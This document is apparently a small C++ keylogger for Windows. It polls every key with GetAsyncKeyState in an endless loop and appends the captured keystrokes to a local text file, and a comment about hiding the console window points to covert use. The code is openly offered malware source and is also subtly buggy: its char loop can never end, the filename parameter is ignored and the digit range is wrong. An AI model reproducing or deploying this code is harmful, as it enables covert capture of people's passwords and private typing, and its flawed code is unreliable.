#include<windows.h> //for hide cmd
#include<cstdlib> //for use system function
#include<iostream>
#include<conio.h>
#include<fstream>
using namespace std;

int keylog(int i,char *text);


int main(){
	//system("runmybat.bat");
    while(true){               //for infinite loop
         for(char i=0;i<=255;i++){
            if(GetAsyncKeyState(i) == -32767){
            	keylog(i,"key.txt");
			}
            
         }
    }
    return 0;
}

int keylog(int out, char *text){
  ofstream fout("abc.txt",ios::app); // (ios::app)---> All output operations are performed at the end of the file, appending the content to the current content of the file.
   cout<<out<<endl;
   if (out==9)
    fout<<"\nTAB\n";
   else if (out==32)
    fout<<' ';
   else if (out==13)
    fout<<'\n';
   else if (out==16)
    fout<<"\nSHIFT\n";
   else if (out>=48&&out<=59)
    fout<<out-48;
   else if (out>=65&&out<=90)
    fout<<char(tolower(out));
    fout.close();
}

 
